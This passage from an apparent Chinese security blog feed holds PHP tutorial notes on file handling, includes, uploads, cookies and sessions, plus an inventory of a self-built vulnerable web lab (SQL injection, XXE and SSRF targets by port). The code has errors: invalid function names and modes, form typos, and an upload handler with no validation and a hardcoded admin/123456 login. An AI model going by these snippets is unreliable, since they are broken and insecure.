<li><a href="http://sunu11.com/2019/12/13/learning-CSP/" target="_blank" rel="noopener">learning_CSP</a></li>
<li><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">A Wormable XSS on HackMD!</a></li>
</ul>
]]></content>
      <categories>
        <category>Privilge</category>
      </categories>
  </entry>
  <entry>
    <title>php文件相关操作</title>
    <url>/2020/07/12/php_file_about/</url>
    <content><![CDATA[<hr>
<h2 id="php文件相关操作"><a href="#php文件相关操作" class="headerlink" title="php文件相关操作"></a>php文件相关操作</h2><ul>
<li>文件操作</li>
<li>文件包含<ul>
<li>文件包含形式</li>
<li>区别</li>
<li>文件加载原理</li>
<li>文件加载路径</li>
<li>文件嵌套包含</li>
</ul>
</li>
<li>文件上传<ul>
<li>配置php.ini</li>
<li>新建一个文件上传</li>
</ul>
</li>
</ul>
<h3 id="0X00-文件操作"><a href="#0X00-文件操作" class="headerlink" title="0X00 文件操作"></a>0X00 文件操作</h3><ul>
<li>fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。<ul>
<li>$myfile = fopen(“webdictionary.txt”, “r”) or die(“Unable to open file!”);</li>
</ul>
</li>
<li>读文件<ul>
<li>Fgets($find) //读第一行文件<ul>
<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件(并还未由 fclose() 关闭)。</li>
<li>▲ fget()可以被用来模拟get/post请求，结合fopen()和fsockopen()两个函数</li>
</ul>
</li>
<li>Fread($find,获取字节) //指定获取内容</li>
<li>Filesize($find) //获取文件字节<ul>
<li>▲ $find 必须为路径</li>
</ul>
</li>
<li>Fclose($find) //关闭资源</li>
</ul>
</li>
<li>修改或添加文件内容<ul>
<li>Fopen(./1.xx,”a+”);</li>
<li>Fwrite(“文件”,”内容”);<ul>
<li>▲ 只能将字符串string写进文件，无法将数组写进</li>
<li>▲ 写进数组可借用file_put_contents()函数</li>
</ul>
</li>
<li>Fclose(find);  //关闭资源</li>
</ul>
</li>
<li>文件指针feof()<ul>
<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件（并还未由 fclose()关闭）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //读文件</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    echo Fgets($f);  //读第一行文件</span><br><span class="line">    echo Fgets($f);  //读第二行文件</span><br><span class="line">    echo Fread($f,2);  //获取文件前两个字符</span><br><span class="line"></span><br><span class="line">    echo Filesize($f);  //获取屋内按总的字符数</span><br><span class="line">    echo Fread($f,Filesize(&apos;./1.html&apos;));  //输出1.html中的所有内容</span><br><span class="line"></span><br><span class="line">    Fclose($f);  //关闭文件</span><br><span class="line">    echo Fread($f,2);  //无法读取到文件</span><br><span class="line"></span><br><span class="line">    //读写文件</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //在文件最后添加aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //删除文件，并在文件开头添加aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    //路径拼接</span><br><span class="line"></span><br><span class="line">    $lujing = $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $f = fopen($lujing.&quot;123.txt&quot;,&quot;a.txt&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa\r\n&apos;);  //写入成功</span><br><span class="line"></span><br><span class="line">    //命令读取文件</span><br><span class="line"></span><br><span class="line">    echo `dir`;  //读取系统路径</span><br><span class="line"></span><br><span class="line">    echo `type d:\\1.txt`;  //读取1.txt文件中的内容</span><br><span class="line"></span><br><span class="line">    //文件指针</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;r+&quot;);</span><br><span class="line">    while(!feof($f))</span><br><span class="line">    &#123;</span><br><span class="line">        $result.= fgets($f,128);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //输出1.txt的所有内容</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X01-文件包含"><a href="#0X01-文件包含" class="headerlink" title="0X01 文件包含"></a>0X01 文件包含</h3><h5 id="文件包含形式"><a href="#文件包含形式" class="headerlink" title="文件包含形式"></a>文件包含形式</h5><ul>
<li>四种文件包含形式<ul>
<li>Include：包含文件</li>
<li>Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）</li>
<li>Require：与include相同</li>
<li>Require_once：以include_once相同</li>
</ul>
</li>
<li>向上包含<ul>
<li>先包含文件，后使用文件中的内容  </li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include1.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //被包含文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //定义数据</span><br><span class="line">    $a = 1;</span><br><span class="line">    define(&apos;PI&apos;,3.14);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //包含文件：使用数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件</span><br><span class="line">    include &apos;include1.php&apos;; //包含当前文件include2.php所在文件夹下的include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //再次加载</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>向下包含<ul>
<li>先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include3.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //定义数据</span><br><span class="line"></span><br><span class="line">    $a = 10;</span><br><span class="line">    const PI = 3.14;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件：为了显示以上数据</span><br><span class="line">    include_once &apos;include4.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include4.php</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><ul>
<li>Include和include_once<ul>
<li>Include系统会碰到一次，执行一次；如果对统一个文件进行多次加载，那么系统会执行多次；</li>
<li>Include_once：系统碰到多次，也只会执行一次。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //包含文件：使用数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件</span><br><span class="line">    include &apos;include1.php&apos;; //包含当前文件include2.php所在文件夹下的include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //再次加载</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Require和include<ul>
<li>本质都是包含文件，唯一的区别在于包含不到文件的时候，报错的形式不一样</li>
<li>Include的错误级别比较轻：不会阻止代码执行</li>
<li>Require要求较高：如果包含出错代码不再执行（require后面的代码）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include5.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //require和include的区别</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //include包含文件</span><br><span class="line">    //include &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line">    //require包含文件</span><br><span class="line">    require &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo &apos;hello world&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h5><ul>
<li>PHP代码的执行流程<ul>
<li>读取代码文件（PHP程序）</li>
<li>编译：将PHP代码转换成字节码（生成opcode）</li>
<li>zendengine来解析opcode，按照字节码去进行逻辑运算</li>
<li>转换成对应的HTML代码</li>
</ul>
</li>
<li>文件加载原理<ul>
<li>在文件加载（include或者require）的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li>
<li>加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</li>
<li>在PHP中被包含的文件是单独进行编译的</li>
</ul>
</li>
<li>▲ PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错</li>
</ul>
<h5 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h5><ul>
<li>文件在加载的时候需要指定文件路径才能保证PHP正确的找到对应的文件</li>
<li>绝对路径：从磁盘的根目录开始（本地绝对路径）<ul>
<li>Windows：盘符C:/路径/PHP文件</li>
<li>Linux：/路径/PHP文件</li>
</ul>
</li>
<li>相对路径：从当前文件所在目录开始的路径<ul>
<li>.|./：表示当前文件夹</li>
<li>../：上级目录（当前文件夹的上一层文件夹）</li>
</ul>
</li>
<li>效率对比<ul>
<li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li>
<li>相对路径相对效率高些，但是容易出错（相对路径会发生改变）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //PHP文件加载路径</span><br><span class="line"></span><br><span class="line">    //相对路径加载</span><br><span class="line">    //include_once &apos;include1.php&apos;;  //默认当前文件本身</span><br><span class="line"></span><br><span class="line">    //include_once &apos;./include1.php&apos;;    </span><br><span class="line"></span><br><span class="line">    //复杂相对路径</span><br><span class="line">    //include_once &apos;../htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //绝对路径</span><br><span class="line">    include_once &apos;D:/server/Apache24/htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo $a;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h5><ul>
<li>一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件</li>
</ul>
<h3 id="0X02-文件上传"><a href="#0X02-文件上传" class="headerlink" title="0X02 文件上传"></a>0X02 文件上传</h3><ul>
<li>表单的enctype属性规定在发送到服务器之前应该如何对表单数据进行编码<ul>
<li>application/x-www-form-urlencoded -&gt; 在发送前编码所有字符（默认）</li>
<li>multipart/form-data -&gt; 不对字符编码，在使用包含文件上传控件的表单时，必须使用该值</li>
<li>text/plain  -&gt; 空格转为”+”加号，但不对特殊字符编码</li>
</ul>
</li>
</ul>
<h5 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h5><ul>
<li>file_upload = on  //是否允许文件上传，默认开启，即允许上传文件</li>
<li>upload_tmp_dir =   //文件上传到服务器后产生的临时文件路径，如果没有指定临时文件路径，那么使用系统的临时目录，一般会修改配置文件，指定临时目录</li>
<li>upload_max_filesize = 2M  //允许上传的单个文件的最大值</li>
<li>max_file_uploads = 20  //一次上传文件允许的最大数目</li>
</ul>
<h5 id="新建一个文件上传"><a href="#新建一个文件上传" class="headerlink" title="新建一个文件上传"></a>新建一个文件上传</h5><ul>
<li>1.html</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form actiion=&quot;&quot; method=&quot;post&quot; enctype=&quot;,ultipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    上传:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>demo.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_FILES);  //输出一个二维数组</span><br><span class="line"></span><br><span class="line">    include_once &apos;./1.html&apos;;</span><br><span class="line"></span><br><span class="line">    //上传文件</span><br><span class="line"></span><br><span class="line">    $f = empty($_FILES)?&quot;&quot; : $_FILES[&quot;file2&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    switch($_FILES[&quot;file2&quot;][&quot;error&quot;])</span><br><span class="line">    &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        @move_upload_file($f,&quot;./111.jpg&quot;);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            # code...</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //变化</span><br><span class="line">    时间戳 -&gt; time().&quot;.jpg&quot;</span><br><span class="line">    后缀截取 -&gt; $filechar = $_FILES[&apos;file2&apos;][&apos;name&apos;] -&gt; 字符串处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>php cookie</title>
    <url>/2020/07/12/php_cookie/</url>
    <content><![CDATA[<hr>
<h3 id="php-cookie"><a href="#php-cookie" class="headerlink" title="php cookie"></a>php cookie</h3><h5 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h5><ul>
<li>session.save_path=”D:\phpStudy\tmp\tmp”</li>
<li>请求网站如果COOKIE没有PHPSESSID 那服务器就给你定义一个PHPSESSID<br>如果请求网站有PHPSESSID，服务器看到了PHPSESSID之后获取PHPSESSID的内容去找sessionID的内容名字的文件名。</li>
<li>session操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();  //会话开始</span><br><span class="line">    $username = empty($_POST[&apos;username&apos;])? &quot;&quot; : $_POST[&apos;username&apos;];</span><br><span class="line">    $password = empty($_POST[&apos;password&apos;])? &quot;&quot; : $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($_SESSION[&apos;username&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;1&apos;;</span><br><span class="line">    &#125;elseif($username == &apos;admin&apos; and $password == &apos;123456&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;登陆成功&quot;;</span><br><span class="line">        $_SESSION[&apos;username&apos;]=&apos;1&apos;;  //写入session文件</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include_once &apos;./form.html&apos;;  //包含表单</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="Cookie跨域"><a href="#Cookie跨域" class="headerlink" title="Cookie跨域"></a>Cookie跨域</h5><ul>
<li>默认的，cookie只能对当前域名（完整域名：有效的二级域名）有效</li>
<li>cookie跨域：指的是允许cookie在不同的二级域名之间共享（一级域名一致）</li>
<li>PHP设置COOKIE</li>
<li>SetCookie(“名字”,值,有效时间,’有效路径’,’有效域’);</li>
<li>SetCookie(‘PHPSESSID’,session_id(),time()+100,’/‘,”xss.cn”);</li>
<li>▲ session.auto_start = 0  //在配置文件中，默认不开启session_start()</li>
<li>▲ session.name = PHPSESSID  //跨域要设置Cookie的名称</li>
<li>▲ session.cookie_domain =   //cookie的跨域，默认为空不能跨域</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //发送cookie-1</span><br><span class="line">    session_start();</span><br><span class="line">    Setcookie(&apos;name&apos;,&apos;xindong&apos;,time()+100,&apos;/&apos;,&apos;127.0.0.1&apos;);</span><br><span class="line">    echo session_id();  //输出cookie</span><br><span class="line"></span><br><span class="line">    //发送cookie-2</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;name&apos;] = &apos;xindong&apos;;</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    Setcookie(&apos;name&apos;,session_id(),time()+100,&apos;/&apos;,&apos;127.0.0.1&apos;);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="跨域尝试"><a href="#跨域尝试" class="headerlink" title="跨域尝试"></a>跨域尝试</h5><ul>
<li>删除session</li>
<li>虚拟主机/hosts文件 -&gt; <a href="http://www.test1mzt.com/cookie.www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com/cookie.www.test1mzt.com</a></li>
<li>设置cookie的域 -&gt; <a href="http://www.test1mzt.com（www.test1mzt.com下的1.php）" target="_blank" rel="noopener">www.test1mzt.com（www.test1mzt.com下的1.php）</a></li>
<li>打印cookie -&gt; cookie.<a href="http://www.test1mzt.com（cookie.www.test1mzt.com的1.php）" target="_blank" rel="noopener">www.test1mzt.com（cookie.www.test1mzt.com的1.php）</a></li>
<li>访问<a href="http://www.test1mzt.com尝试" target="_blank" rel="noopener">www.test1mzt.com尝试</a> -&gt; 是否输出xindong</li>
<li>访问cookie.<a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a> -&gt; 是否输出为xindong</li>
<li>/test1/1.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;name&apos;] = &apos;xindong&apos;;</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    var_dump(session_id());</span><br><span class="line">    Setcookie(&apos;PHPSESSID&apos;,session_id(),time()+100,&apos;/&apos;,&apos;www.test1mzt.com&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>/cookie.test1/1.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    var_dump(session_id());</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Web--Training v1.0</title>
    <url>/2020/07/12/web_training/</url>
    <content><![CDATA[<hr>
<h3 id="Web–Training-v1-0"><a href="#Web–Training-v1-0" class="headerlink" title="Web–Training v1.0"></a>Web–Training v1.0</h3><p>⭐ 靶场链接为度盘：链接：<a href="https://pan.baidu.com/s/1I0oJLdVzjv0grHzlgITvLg" target="_blank" rel="noopener">https://pan.baidu.com/s/1I0oJLdVzjv0grHzlgITvLg</a> 提取码：dcib</p>
<blockquote>
<p>   靶场要点：</p>
<ol>
<li><p>本靶场为自搭建，素材源码来自互联网以及自编写，若有侵权，联系我删除</p>
</li>
<li><p>本靶场只用作Web安全初学者所用，靶场收集来之不易，且用且珍惜</p>
</li>
<li><p>本靶场不用做任何商业用途，只作学习交流</p>
</li>
</ol>
</blockquote>
<ul>
<li>靶场系统<ul>
<li>Window Server 2003 Enterprise Edition Service Pack 2</li>
</ul>
</li>
<li>Web服务（由PHPstudy、JSPstudy以及自安装）<ul>
<li>php 5.3.29/5.3.29-nts/5.2.17</li>
<li>Apache 2.4.10</li>
<li>Nginx 1.6.2</li>
<li>MySQL 5.5.40</li>
<li>phpMyAdmin 3.5.8.2</li>
<li>OpenSSL 1.0.1e&amp;0.9.8y</li>
<li>JDK 1.7_51</li>
<li>Tomcat 6.0.44</li>
<li>IIS6.0</li>
<li>PostgreSQL 8.2</li>
<li>SQL Server 2005</li>
<li>Redis 2.6.8-pre2</li>
</ul>
</li>
<li>另安装扩展<ul>
<li>ISAPI_Rewrite3</li>
</ul>
</li>
<li>Web Application Firewall     <ul>
<li>SafeDogIIS（安全狗）V4.0</li>
<li>D盾 v2.1.5.4</li>
<li>云锁 v3.1.18.5</li>
<li>libinjection-3.10.0（有安装包，暂未安装）</li>
<li>ModSecurityIIS_2.9.3-32b.msi（有安装包，暂未安装）</li>
<li>SafeDogApache（安全狗）V4.0（有安装包，暂未安装）</li>
<li>ngx_lua_waf-0.7.2（有安装包，暂未安装）</li>
<li>PHPIDS-0.7（有安装包，暂未安装）</li>
</ul>
</li>
</ul>
<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><ul>
<li>源码靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8001</td>
<td align="center">Access注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8002</td>
<td align="center">Mssql注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8003</td>
<td align="center">Mysql注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8004</td>
<td align="center">Postgresql注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8011</td>
<td align="center">Cookie注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8012</td>
<td align="center">伪静态注入</td>
<td align="center">需要开启ISAPI_Rewrite3重写扩展</td>
</tr>
<tr>
<td align="center">8013</td>
<td align="center">Get注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8014</td>
<td align="center">Post注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8015</td>
<td align="center">二阶注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8016</td>
<td align="center">XFF注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8017</td>
<td align="center">XML文件注入</td>
<td align="center">只是文件存储，非XXE</td>
</tr>
<tr>
<td align="center">8018</td>
<td align="center">Union联合注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8019</td>
<td align="center">报错注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8020</td>
<td align="center">Boolean注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8021</td>
<td align="center">Base64注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8022</td>
<td align="center">时间注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8023</td>
<td align="center">宽字节注入(Get)</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8024</td>
<td align="center">堆叠注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8025</td>
<td align="center">Insert型注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8026</td>
<td align="center">Delete型注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8027</td>
<td align="center">Update型注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8028</td>
<td align="center">搜索型注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8029</td>
<td align="center">宽字节注入</td>
<td align="center">有注入用代码widebytes-post.php/widebytes-post.py</td>
</tr>
<tr>
<td align="center">8030</td>
<td align="center">Order by注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8031</td>
<td align="center">Group by注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8032</td>
<td align="center">二次编码注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8033</td>
<td align="center">万能密钥-简单</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8034</td>
<td align="center">万能密钥-Uinon</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li>CMS/比赛靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8051</td>
<td align="center">Bluecms</td>
<td align="center">Http头注入</td>
</tr>
<tr>
<td align="center">8052</td>
<td align="center">74cms</td>
<td align="center">二阶注入</td>
</tr>
<tr>
<td align="center">8053</td>
<td align="center">Jeany</td>
<td align="center">搜索型注入</td>
</tr>
<tr>
<td align="center">8054</td>
<td align="center">南方数据</td>
<td align="center">Cookie注入</td>
</tr>
<tr>
<td align="center">8055</td>
<td align="center">Beecms</td>
<td align="center">后台注入</td>
</tr>
<tr>
<td align="center">8056</td>
<td align="center">W78cms</td>
<td align="center">搜索框注入</td>
</tr>
<tr>
<td align="center">8057</td>
<td align="center">Shop7z</td>
<td align="center">偏移注入</td>
</tr>
<tr>
<td align="center">8058</td>
<td align="center">佛山发发鱼</td>
<td align="center">偏移注入</td>
</tr>
<tr>
<td align="center">8059</td>
<td align="center">Phpcms_v9</td>
<td align="center">Authkey注入，有注入用代码phpv9 authkey.php</td>
</tr>
<tr>
<td align="center">8060</td>
<td align="center">Xycms家庭装修</td>
<td align="center">Access注入</td>
</tr>
<tr>
<td align="center">8061</td>
<td align="center">MetInfo v5.0</td>
<td align="center">Sql注入</td>
</tr>
<tr>
<td align="center">8062</td>
<td align="center">Xycms搬家</td>
<td align="center">Sql注入</td>
</tr>
<tr>
<td align="center">8063</td>
<td align="center">Xdcms</td>
<td align="center">Post注入</td>
</tr>
<tr>
<td align="center">8064</td>
<td align="center">19年强网杯随便注</td>
<td align="center">堆叠注入，需初始化数据库</td>
</tr>
</tbody></table>
<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><ul>
<li>源码靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8101</td>
<td align="center">XXE有回显注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8102</td>
<td align="center">XXE无回显有报错注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8103</td>
<td align="center">XXE无报错无回显注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8104</td>
<td align="center">Simplexml_load_string</td>
<td align="center">php函数</td>
</tr>
<tr>
<td align="center">8105</td>
<td align="center">DOMDocument</td>
<td align="center">php函数</td>
</tr>
<tr>
<td align="center">8106</td>
<td align="center">SimpleXMLElement</td>
<td align="center">php函数</td>
</tr>
</tbody></table>
<ul>
<li>CMS/比赛靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8151</td>
<td align="center">S-CMS医院建站系统v3.0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8152</td>
<td align="center">MetInfo-v6.0.0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8153</td>
<td align="center">Phpshe-v1.7</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><ul>
<li>源码靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8201</td>
<td align="center">ssrf全测试</td>
<td align="center">多种协议的测试，dict/http/gopher/file等协议，测试时可开启redis-server</td>
</tr>
<tr>
<td align="center">8202</td>
<td align="center">ssrf无回显</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8303</td>
<td align="center">ssrf-http(s)测试</td>
<td align="center">有注入用代码301.php/302.php</td>
</tr>
<tr>
<td align="center">8204</td>
<td align="center">file-get-contents</td>
<td align="center">php函数</td>
</tr>
<tr>
<td align="center">8205</td>
<td align="center">fsockopen</td>
<td align="center">php函数</td>
</tr>
</tbody></table>
<ul>
<li>CMS/比赛靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8251</td>
<td align="center">Disccuz-x3.1</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><ul>
